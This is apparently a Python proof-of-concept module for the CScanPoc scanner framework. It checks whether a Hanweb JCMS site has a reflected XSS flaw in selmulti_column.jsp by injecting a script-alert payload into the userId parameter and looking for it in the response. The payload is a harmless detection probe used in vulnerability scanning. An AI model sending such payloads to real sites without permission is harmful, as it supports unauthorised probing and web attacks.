# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '58114aa4-c5c9-42bf-9593-ca06d39729a0'
    name = '大汉版通JCMS XSS' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-12-20'  # 漏洞公布时间
    desc = '''
        大汉版通JCMS XSS跨站脚本漏洞,漏洞文件在/m_5_b/selmulti_column.jsp中。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=076816
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9577647e-5ba1-4c63-9d68-cd2c44225b6d'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/jcms/m_5_b/selmulti_column.jsp?type=1&userId=2222222%2b><script>alert(/test/)</script>'
            url = '{target}'.format(target=self.target)+payload
            code,head,body,errcode,fina_url= hh.http(url)
                       
            if code==200 and '<script>alert(/test/)</script>' in body :
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()